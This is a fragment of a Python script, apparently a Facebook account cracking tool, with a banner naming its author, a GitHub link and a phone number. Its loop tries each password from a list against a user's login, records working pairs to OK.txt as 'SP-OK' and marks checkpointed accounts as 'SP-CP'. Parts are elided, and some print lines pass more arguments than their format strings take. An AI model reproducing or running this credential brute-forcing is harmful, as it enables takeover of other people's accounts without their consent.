...
╚═════╝░╚═╝░░░░░░░░░░░╚═════╝░╚═════╝░
	...
	print("")
	print("%s╔══════════════════════════════════════════╗"%(Z))
	print("%s║%s  Author   : SHAWPON SP                   %s║"%(Z,B,M,Z))
	print("%s║%s  Github   : https://github.com/Shawpon1  %s║"%(Z,B,Z))
	print("%s║%s  Telegram : 01318697021      %s║"%(Z,B,Z))
	print("%s║%s  Version  : 3.3                          %s║"%(Z,B,H,Z))
	print("%s╚══════════════════════════════════════════╝"%(Z))
	print("")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in result:
				print('\033[1;32m [SP-OK] '+user+'|'+pw+'\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result["error_msg"]:
				print(result)
				print('\033[1;31m [SP-CP] '+user+'|'+pw+'\033[0;97m')
